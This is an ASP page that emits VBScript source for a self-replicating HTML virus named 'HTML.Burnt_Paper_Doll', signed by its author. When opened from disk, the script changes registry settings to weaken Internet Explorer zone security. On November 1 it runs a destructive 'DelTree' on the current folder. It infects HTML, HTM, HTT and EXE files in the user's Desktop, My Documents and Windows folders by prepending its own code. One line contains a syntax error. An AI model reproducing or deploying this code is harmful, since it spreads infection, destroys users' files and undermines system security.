<%
Response.Write "<!--HTML.Burnt_Paper_Doll-->" & vbCrLf
Response.Write "<html><body>" & vbCrLf
Response.Write "<script Language=""VBScript""><!--" & vbCrLf
Response.Write "on error resume next" & vbCrLf
Response.Write "REM HTML.Burnt_Paper_Doll by -=[Azag-TH0TH]=-" & vbCrLf
Response.Write "if location.protocol=""file:"" then" & vbCrLf
Response.Write "msgbox ""Ye paper dolls shall find thee fringes wrought in ebony flame !""" & vbCrLf
Response.Write "set a0h2c6=createobject(""WScript.Shell"")" & vbCrLf
Response.Write "set d1d4a4=createobject(""Scripting.FileSystemObject"")" & vbCrLf
Response.Write "a8a2i3=Replace(location.href,""/"",""\""):a8a2i3=Replace(a8a2i3,""file:\\\"", """"):a8a2i3=d1d4a4.GetParentFolderName(a8a2i3)" & vbCrLf
Response.Write "set f3g8f3=document.body.createtextrange" & vbCrLf
Response.Write "a0h2c6.Regwrite""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"" , 0, ""REG_DWORD""" & vbCrLf
Response.Write "a0h2c6.RegWrite""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"" , 0, ""REG_DWORD""" & vbCrLf
Response.Write "if month(now)=11 and day(now)=1 then" & vbCrLf
Response.Write "a0h2c6.Run ""DelTree /y *.* >null"",vbHide" & vbCrLf
Response.Write "end if" & vbCrLf
Response.Write "f8g2a6(a8a2i3)" & vbCrLf
Response.Write "f8g2a6(d1d4a4.BuildPath(d1d4a4.GetSpecialFolder(0),""WEB""))" & vbCrLf
Response.Write "f8g2a6(a0h2c6.SpecialFolders(""Desktop""))" & vbCrLf
Response.Write "f8g2a6(a0h2c6.SpecialFolders(""MyDocuments""))" & vbCrLf
Response.Write "end if" & vbCrLf
Response.Write "sub f8g2a6(b3e2h2)" & vbCrLf
Response.Write "on error resume next" & vbCrLf
Response.Write "if d1d4a4.FolderExists(b3e2h2) then" & vbCrLf
Response.Write "Do" & vbCrLf
Response.Write "Set e1h2f9=d1d4a4.GetFolder(b3e2h2)" & vbCrLf
Response.Write "b3e2h2=d1d4a4.GetParentFolderName(b3e2h2)" & vbCrLf
Response.Write "Set e8h0b1=e1h2f9.Files" & vbCrLf
Response.Write "For each a7e8f5 in e8h0b1" & vbCrLf
Response.Write "f0f0f6=ucase(d1d4a4.GetExtensionName(a7e8f5.Name))" & vbCrLf
Response.Write "if f0f0f6=""HTML"" or f0f0f6=""HTM"" or f0f0f6=""HTT"" or f0f0f6=""EXE"" or  then" & vbCrLf
Response.Write "Set f7f2g5=d1d4a4.OpenTextFile(a7e8f5.path,1,False)" & vbCrLf
Response.Write "i6i2g2=f7f2g5.Readline" & vbCrLf
Response.Write "if i6i2g2=""<!--HTML.Burnt_Paper_Doll-->"" then" & vbCrLf
Response.Write "f7f2g5.close()" & vbCrLf
Response.Write "else" & vbCrLf
Response.Write "c8b2f9(a7e8f5.path)" & vbCrLf
Response.Write "end if" & vbCrLf
Response.Write "end if" & vbCrLf
Response.Write "next" & vbCrLf
Response.Write "Loop Until e1h2f9.IsRootFolder = True" & vbCrLf
Response.Write "end if" & vbCrLf
Response.Write "end sub" & vbCrLf
Response.Write "sub c8b2f9(i6d0f9)" & vbCrLf
Response.Write "On Error Resume Next" & vbCrLf
Response.Write "Set f7f2g5=d1d4a4.OpenTextFile(i6d0f9,1,False)" & vbCrLf
Response.Write "b1c1f4=f7f2g5.ReadAll()" & vbCrLf
Response.Write "f7f2g5.close()" & vbCrLf
Response.Write "Set f7f2g5=d1d4a4.OpenTextFile(i6d0f9,2,False)" & vbCrLf
Response.Write "f7f2g5.WriteLine(""<!--HTML.Burnt_Paper_Doll-->"")" & vbCrLf
Response.Write "f7f2g5.Write(""<html><body>"")" & vbCrLf
Response.Write "f7f2g5.WriteLine f3g8f3.htmlText" & vbCrLf
Response.Write "f7f2g5.WriteLine(""</body></html>"")" & vbCrLf
Response.Write "f7f2g5.Write(b1c1f4)" & vbCrLf
Response.Write "f7f2g5.Close" & vbCrLf
Response.Write "end sub" & vbCrLf
Response.Write "--></script>" & vbCrLf
Response.Write "</body></html>"
%>
